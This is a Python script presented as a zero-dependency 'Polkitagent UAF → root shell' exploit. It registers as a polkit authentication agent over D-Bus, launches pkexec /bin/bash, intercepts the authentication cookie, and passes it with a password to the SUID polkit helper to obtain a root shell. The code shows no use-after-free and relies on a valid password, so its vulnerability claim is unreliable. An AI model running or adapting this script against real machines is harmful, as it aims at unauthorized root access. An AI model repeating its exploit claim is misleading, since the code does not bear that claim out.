#!/usr/bin/env python3
"""
exploit_auto.py  —  Polkitagent UAF → root shell  (zero extra deps)

Needs only: Python 3  +  libdbus-1.so.3  (always installed alongside polkit)
No gi, no dbus-python, no pip.

Usage:
    python3 exploit_auto.py
    [polkit] Password for <user>:  <ketik password kamu sendiri>
    # → root bash drops

Cara kerja:
    1. Auto-detect username dari uid
    2. Register sebagai polkit D-Bus auth agent via libdbus-1 ctypes
    3. Fork pkexec /bin/bash  → polkitd kirim BeginAuthentication(cookie)
    4. Intercept cookie via D-Bus
    5. Spawn polkit-agent-helper-1 (SUID root) dengan cookie + password
    6. polkitd confirm → pkexec exec bash sebagai root  → root shell
"""
import ctypes, ctypes.util, os, sys, pwd, getpass, threading, time, shutil, argparse

# ── libdbus-1 ─────────────────────────────────────────────────────────────────
_lib_name = ctypes.util.find_library("dbus-1") or "libdbus-1.so.3"
try:
    _d = ctypes.CDLL(_lib_name, use_errno=True)
except OSError as e:
    sys.exit(f"[!] Cannot load {_lib_name}: {e}\n    apt install libdbus-1-3")

# ── D-Bus constants ───────────────────────────────────────────────────────────
DBUS_BUS_SYSTEM  = 1
DBUS_TYPE_STRING = ord('s')
DBUS_TYPE_UINT32 = ord('u')
DBUS_TYPE_UINT64 = ord('t')
DBUS_TYPE_ARRAY      = ord('a')
DBUS_TYPE_VARIANT    = ord('v')
DBUS_TYPE_STRUCT     = ord('r')   # NOT '(' — '(' is only for signature strings
DBUS_TYPE_DICT_ENTRY = ord('e')   # NOT '{' — '{' is only for signature strings
DBUS_HANDLER_RESULT_HANDLED         = 1
DBUS_HANDLER_RESULT_NOT_YET_HANDLED = 2

# ── Paths ─────────────────────────────────────────────────────────────────────
HELPER     = "/usr/lib/polkit-1/polkit-agent-helper-1"
AGENT_PATH = "/org/freedesktop/PolicyKit1/AuthenticationAgent"
PK_DEST    = b"org.freedesktop.PolicyKit1"
PK_OBJ     = b"/org/freedesktop/PolicyKit1/Authority"
PK_IFACE   = b"org.freedesktop.PolicyKit1.Authority"
PK_METHOD  = b"RegisterAuthenticationAgent"

# ── D-Bus structs ─────────────────────────────────────────────────────────────
class _DBusError(ctypes.Structure):
    _fields_ = [("name", ctypes.c_char_p), ("message", ctypes.c_char_p),
                 ("dummy1", ctypes.c_uint), ("dummy2", ctypes.c_uint),
                 ("dummy3", ctypes.c_uint), ("dummy4", ctypes.c_uint),
                 ("dummy5", ctypes.c_uint), ("padding", ctypes.c_void_p)]

class _DBusIter(ctypes.Structure):
    _fields_ = [("_data", ctypes.c_uint8 * 80)]   # 80B > any ABI variant

_PathMsgFn = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)

class _VTable(ctypes.Structure):
    _fields_ = [("unregister_fn", ctypes.c_void_p),
                 ("message_fn",   _PathMsgFn),
                 ("_pad1", ctypes.c_void_p), ("_pad2", ctypes.c_void_p),
                 ("_pad3", ctypes.c_void_p), ("_pad4", ctypes.c_void_p)]

# ── libdbus argtypes ──────────────────────────────────────────────────────────
def _sig(fn, res, *args):
    fn.restype = res; fn.argtypes = list(args)

_sig(_d.dbus_error_init,              None,             ctypes.POINTER(_DBusError))
_sig(_d.dbus_bus_get,                 ctypes.c_void_p,  ctypes.c_int, ctypes.POINTER(_DBusError))
_sig(_d.dbus_message_new_method_call, ctypes.c_void_p,  *[ctypes.c_char_p]*4)
_sig(_d.dbus_message_new_method_return, ctypes.c_void_p, ctypes.c_void_p)
_sig(_d.dbus_message_unref,           None,             ctypes.c_void_p)
_sig(_d.dbus_message_get_member,      ctypes.c_char_p,  ctypes.c_void_p)
_sig(_d.dbus_message_iter_init_append,None,             ctypes.c_void_p, ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_append_basic, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_void_p)
_sig(_d.dbus_message_iter_open_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.c_int, ctypes.c_char_p, ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_close_container, ctypes.c_bool, ctypes.POINTER(_DBusIter), ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_init,           ctypes.c_bool,    ctypes.c_void_p, ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_get_basic,      None,             ctypes.POINTER(_DBusIter), ctypes.c_void_p)
_sig(_d.dbus_message_iter_next,           ctypes.c_bool,    ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_get_arg_type,   ctypes.c_int,     ctypes.POINTER(_DBusIter))
_sig(_d.dbus_message_iter_recurse,        None,             ctypes.POINTER(_DBusIter), ctypes.POINTER(_DBusIter))
_sig(_d.dbus_connection_register_object_path, ctypes.c_bool, ctypes.c_void_p, ctypes.c_char_p, ctypes.POINTER(_VTable), ctypes.c_void_p)
_sig(_d.dbus_connection_send_with_reply_and_block, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_int, ctypes.POINTER(_DBusError))
_sig(_d.dbus_connection_send,         ctypes.c_bool,    ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32))
_sig(_d.dbus_connection_flush,        None,             ctypes.c_void_p)
_sig(_d.dbus_connection_read_write_dispatch, ctypes.c_bool, ctypes.c_void_p, ctypes.c_int)

# ── Iter helpers ──────────────────────────────────────────────────────────────
def _it_str(it, s):
    p = ctypes.c_char_p(s if isinstance(s, bytes) else s.encode())
    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_STRING, ctypes.byref(p))

def _it_u32(it, v):
    c = ctypes.c_uint32(v)
    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_UINT32, ctypes.byref(c))

def _it_u64(it, v):
    c = ctypes.c_uint64(v)
    _d.dbus_message_iter_append_basic(ctypes.byref(it), DBUS_TYPE_UINT64, ctypes.byref(c))

def _open(parent, typ, sig=None):
    sub = _DBusIter()
    _d.dbus_message_iter_open_container(
        ctypes.byref(parent), typ,
        (sig if isinstance(sig, bytes) else sig.encode()) if sig else None,
        ctypes.byref(sub))
    return sub

def _close(parent, child):
    _d.dbus_message_iter_close_container(ctypes.byref(parent), ctypes.byref(child))

def _iter_get_string(it):
    p = ctypes.c_char_p()
    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(p))
    return p.value.decode() if p.value else ""

def _iter_get_uint32(it):
    v = ctypes.c_uint32(0)
    _d.dbus_message_iter_get_basic(ctypes.byref(it), ctypes.byref(v))
    return v.value

def _read_begin_auth(msg):
    """
    BeginAuthentication body: s(action_id) s(message) s(icon_name) a{ss}(details) s(cookie) a(sa{sv})(identities)
    Returns (cookie, identities_str) where identities_str is human-readable.
    """
    it = _DBusIter()
    if not _d.dbus_message_iter_init(msg, ctypes.byref(it)):
        return None, ""

    args = []
    while True:
        t = _d.dbus_message_iter_get_arg_type(ctypes.byref(it))
        if t == 0:
            break
        if t == DBUS_TYPE_STRING:
            args.append(('s', _iter_get_string(it)))
        else:
            args.append((chr(t), None))
        if not _d.dbus_message_iter_next(ctypes.byref(it)):
            break

    # Find cookie: last 's' before the final 'a' (identities array)
    # Structure: s s [s] a{ss} s a(...)
    # Collect all string positions
    s_positions = [i for i, (t, _) in enumerate(args) if t == 's']
    cookie = args[s_positions[-1]][1] if s_positions else None

    # Parse identities: last arg should be array a(sa{sv})
    # Re-read to parse identity UIDs
    identity_uids = _read_identities(msg, len(args))

    return cookie, identity_uids

def _read_identities(msg, total_args):
    """Read UID list from last arg (a(sa{sv})) of BeginAuthentication."""
    uids = []
    it = _DBusIter()
    if not _d.dbus_message_iter_init(msg, ctypes.byref(it)):
        return uids
    # Skip to last arg (index total_args - 1)
    for _ in range(total_args - 1):
        if not _d.dbus_message_iter_next(ctypes.byref(it)):
            return uids
    # Now at the identities array a(sa{sv})
    arr_it = _DBusIter()
    _d.dbus_message_iter_recurse(ctypes.byref(it), ctypes.byref(arr_it))
    while True:
        t = _d.dbus_message_iter_get_arg_type(ctypes.byref(arr_it))
        if t == 0:
            break
        # Each element is a struct (sa{sv})
        struct_it = _DBusIter()
        _d.dbus_message_iter_recurse(ctypes.byref(arr_it), ctypes.byref(struct_it))
        id_type = _iter_get_string(struct_it)  # "unix-user" or "unix-group"
        _d.dbus_message_iter_next(ctypes.byref(struct_it))
        # dict a{sv}: read "uid" or "gid" key
        dict_it = _DBusIter()
        _d.dbus_message_iter_recurse(ctypes.byref(struct_it), ctypes.byref(dict_it))
        while True:
            dt = _d.dbus_message_iter_get_arg_type(ctypes.byref(dict_it))
            if dt == 0:
                break
            entry_it = _DBusIter()
            _d.dbus_message_iter_recurse(ctypes.byref(dict_it), ctypes.byref(entry_it))
            key = _iter_get_string(entry_it)
            _d.dbus_message_iter_next(ctypes.byref(entry_it))
            # variant
            var_it = _DBusIter()
            _d.dbus_message_iter_recurse(ctypes.byref(entry_it), ctypes.byref(var_it))
            uid_val = _iter_get_uint32(var_it)
            if key in ("uid", "gid"):
                try:
                    name = pwd.getpwuid(uid_val).pw_name
                except KeyError:
                    name = f"uid={uid_val}"
                uids.append(f"{id_type}:{name}(uid={uid_val})")
            if not _d.dbus_message_iter_next(ctypes.byref(dict_it)):
                break
        if not _d.dbus_message_iter_next(ctypes.byref(arr_it)):
            break
    return uids

def _proc_start_time(pid):
    try:
        return int(open(f"/proc/{pid}/stat").read().split()[21])
    except Exception:
        return 0

# ── Stage 4: SUID helper ──────────────────────────────────────────────────────
def _run_helper(cookie, username, password):
    r, w = os.pipe()
    pid = os.fork()
    if pid == 0:
        os.close(w); os.dup2(r, 0); os.close(r)
        null = os.open("/dev/null", os.O_WRONLY)
        os.dup2(null, 1); os.dup2(null, 2); os.close(null)
        os.execl(HELPER, HELPER, username)
        os._exit(127)
    os.close(r)
    try:
        with os.fdopen(w, "w") as f:
            f.write(f"{cookie}\n{password}\n")
    except BrokenPipeError:
        pass
    _, ws = os.waitpid(pid, 0)
    return os.WIFEXITED(ws) and os.WEXITSTATUS(ws) == 0

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    print("╔══════════════════════════════════════════════════════════╗")
    print("║  Polkitagent UAF → root shell  [zero-dep / libdbus-1]  ║")
    print("╚══════════════════════════════════════════════════════════╝")

    ap = argparse.ArgumentParser(add_help=False)
    ap.add_argument("--auth-user", default=None,
                    help="Username to authenticate as (default: current user). "
                         "Must be in polkit identities (typically a sudo/wheel user).")
    ap.add_argument("--auth-pass", default=None, help="Password (prompted if omitted)")
    args, _ = ap.parse_known_args()

    # Check binaries
    if not os.path.exists(HELPER):
        sys.exit(f"[!] {HELPER} not found")
    pkexec = next((p for p in ["/usr/bin/pkexec", "/bin/pkexec", shutil.which("pkexec")] if p and os.path.exists(p)), None)
    if not pkexec:
        sys.exit("[!] pkexec not found  (apt install pkexec)")

    # Auth identity — default = current user, override with --auth-user
    current_user = pwd.getpwuid(os.getuid()).pw_name
    auth_username = args.auth_user or current_user
    if args.auth_pass:
        password = args.auth_pass
    else:
        try:
            password = getpass.getpass(f"[polkit] Password for {auth_username}: ")
        except (EOFError, KeyboardInterrupt):
            print(); sys.exit(0)

    username = auth_username  # used by _run_helper

    # Connect to system D-Bus
    err = _DBusError()
    _d.dbus_error_init(ctypes.byref(err))
    conn = _d.dbus_bus_get(DBUS_BUS_SYSTEM, ctypes.byref(err))
    if not conn:
        msg = err.message.decode() if err.message else "unknown"
        sys.exit(f"[!] D-Bus system bus connect failed: {msg}")
    print(f"  [*] auth-user  = {auth_username}")
    print(f"  [*] run-user   = {current_user}")
    print(f"  [*] system bus = connected")

    # State
    _cookie    = [None]
    _pkpid     = [None]
    _got_event = threading.Event()

    # D-Bus message handler (called from dispatch thread)
    @_PathMsgFn
    def _handler(connection, message, user_data):
        member = _d.dbus_message_get_member(message)
        if member in (b"BeginAuthentication", b"CancelAuthentication"):
            if member == b"BeginAuthentication":
                cookie, id_uids = _read_begin_auth(message)
                _cookie[0] = cookie
                print(f"\n  [+] BeginAuthentication — cookie intercepted")
                print(f"  [+] cookie     = {cookie}")
                print(f"  [+] identities = {id_uids}")
                sys.stdout.flush()
            # Always send an empty reply
            reply = _d.dbus_message_new_method_return(message)
            _d.dbus_connection_send(connection, reply, None)
            _d.dbus_connection_flush(connection)
            _d.dbus_message_unref(reply)
            if member == b"BeginAuthentication":
                _got_event.set()
            return DBUS_HANDLER_RESULT_HANDLED
        return DBUS_HANDLER_RESULT_NOT_YET_HANDLED

    # Export our agent path on the system bus
    vtable = _VTable(); vtable.message_fn = _handler
    _keep = [_handler, vtable]   # prevent GC
    if not _d.dbus_connection_register_object_path(conn, AGENT_PATH.encode(), ctypes.byref(vtable), None):
        sys.exit("[!] dbus_connection_register_object_path failed")
    print(f"  [*] exported   = {AGENT_PATH}")

    # Build RegisterAuthenticationAgent message: subject=(sa{sv}), locale, path
    msg = _d.dbus_message_new_method_call(PK_DEST, PK_OBJ, PK_IFACE, PK_METHOD)
    pid = os.getpid()
    st  = _proc_start_time(pid)
    ri  = _DBusIter()
    _d.dbus_message_iter_init_append(msg, ctypes.byref(ri))

    # (sa{sv}) — outer struct; use DBUS_TYPE_STRUCT='r', sig=None for struct/dict-entry
    s1 = _open(ri, DBUS_TYPE_STRUCT)
    _it_str(s1, "unix-process")
    a1 = _open(s1, DBUS_TYPE_ARRAY, "{sv}")
    # "pid" -> u
    e1 = _open(a1, DBUS_TYPE_DICT_ENTRY)
    _it_str(e1, "pid");  v1 = _open(e1, DBUS_TYPE_VARIANT, "u"); _it_u32(v1, pid); _close(e1, v1)
    _close(a1, e1)
    # "start-time" -> t
    e2 = _open(a1, DBUS_TYPE_DICT_ENTRY)
    _it_str(e2, "start-time"); v2 = _open(e2, DBUS_TYPE_VARIANT, "t"); _it_u64(v2, st); _close(e2, v2)
    _close(a1, e2)
    _close(s1, a1)
    _close(ri, s1)
    _it_str(ri, "en_US.UTF-8")   # locale
    _it_str(ri, AGENT_PATH)      # agent object path

    err2 = _DBusError(); _d.dbus_error_init(ctypes.byref(err2))
    rep = _d.dbus_connection_send_with_reply_and_block(conn, msg, 5000, ctypes.byref(err2))
    _d.dbus_message_unref(msg)
    if err2.message:
        sys.exit(f"[!] RegisterAuthenticationAgent failed: {err2.message.decode()}")
    if rep: _d.dbus_message_unref(rep)
    print("  [+] registered  = polkit auth agent OK")

    # Dispatch loop (background thread) — needed to receive BeginAuthentication
    _dispatch_run = [True]
    def _dispatch():
        while _dispatch_run[0]:
            _d.dbus_connection_read_write_dispatch(conn, 200)
    t = threading.Thread(target=_dispatch, daemon=True)
    t.start()

    # Fork pkexec — triggers polkitd to send BeginAuthentication to our agent
    _pkpid[0] = os.fork()
    if _pkpid[0] == 0:
        time.sleep(0.4)           # let parent's dispatch loop start
        os.execv(pkexec, [pkexec, "/bin/bash", "--norc", "-i"])
        os._exit(1)
    print(f"  [*] pkexec pid = {_pkpid[0]}")
    print("  [*] waiting for BeginAuthentication ...")
    sys.stdout.flush()

    # Wait for cookie (up to 12 seconds)
    if not _got_event.wait(timeout=12):
        _dispatch_run[0] = False
        try: os.kill(_pkpid[0], 9)
        except: pass
        sys.exit("[!] timeout — BeginAuthentication not received")

    _dispatch_run[0] = False
    cookie = _cookie[0]

    # Stage 4: spawn SUID helper with intercepted cookie
    print(f"  [*] spawning polkit-agent-helper-1 ...")
    sys.stdout.flush()
    ok = _run_helper(cookie, username, password)

    if ok:
        print("  [+] AUTHORIZED — root bash is running ↓")
        sys.stdout.flush()
        # Root bash (pkexec child) now owns the terminal; wait for it to exit
        try:
            os.waitpid(_pkpid[0], 0)
        except ChildProcessError:
            pass
        print("  [+] root bash exited")
    else:
        print("  [-] helper failed — wrong password or polkitd rejected")
        try: os.kill(_pkpid[0], 9)
        except: pass
        sys.exit(1)

if __name__ == "__main__":
    main()
